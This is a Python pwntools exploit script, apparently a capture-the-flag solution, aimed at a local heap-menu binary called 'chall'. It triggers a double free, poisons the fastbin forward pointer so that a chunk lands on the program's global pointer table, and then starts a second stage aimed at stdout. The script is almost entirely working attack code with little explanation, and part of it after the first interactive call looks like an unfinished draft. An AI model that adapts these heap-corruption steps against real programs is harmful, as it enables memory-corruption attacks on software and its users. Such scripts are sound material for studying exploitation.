from pwn import *


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def new(index, size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'index: ', b'%d' % index)
    io.sendlineafter(b'size: ', b'%d' % size)
    io.sendafter(b'data: ', data)  # becareful about lf
    io.recvuntil(b'new:')


@debug
def edit(index, size, data):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index: ', b'%d' % index)
    io.sendlineafter(b'size: ', b'%d' % size)
    if size > 0:
        io.sendlineafter(b'data: ', data)  # becareful about lf
    io.recvuntil(b'edit:')


@debug
def delete(index):
    io.sendlineafter(b'> ', b'3')
    # io.sendline(b'3')
    io.sendlineafter(b'index: ', b'%d' % index)
    io.recvuntil(b'delete:')


binpath = './chall'
elf = ELF(binpath)
libc = elf.libc


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = 'DEBUG'


gdbscript = '''
gef
b new
b edit
b delete
set $ptr=0x0000000006020B0
'''
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)


# double free
new(0, 0x68, b'hogehoge')
new(1, 0x68, b'fugafuga')
edit(0, 0, b'')
delete(1)
delete(0)
# fill fake fd
new(0, 0x68, p64(0x60202d))
# new(0, 0x68, p64(0x00000000006020a5-8))

print('Consume chunks')
new(1, 0x68, b'consume')
edit(1, 0x78, b'abc')
delete(1)
new(1, 0x68, b'consume')
edit(1, 0x48, b'abc')
delete(1)
print('Done consuming')

print('Overwrite')
payload = b''
payload += b'\x01\x00\x00'
payload += p64(0x00000000006020b0)
new(1, 0x68, payload)

io.interactive()

delete(0)
delete(1)

# double free
new(0, 0x78, b'def')
new(0, 0x78, b'xyz')
edit(0, 0, b'')
delete(1)
delete(0)
new(0, 0x78, p64(elf.symbols['stdout'] - 0x10))

print('Consume chunks')
new(1, 0x78, b'consume')
edit(1, 0x18, b'smaller')
delete(1)
new(1, 0x78, b'consume')


io.interactive()
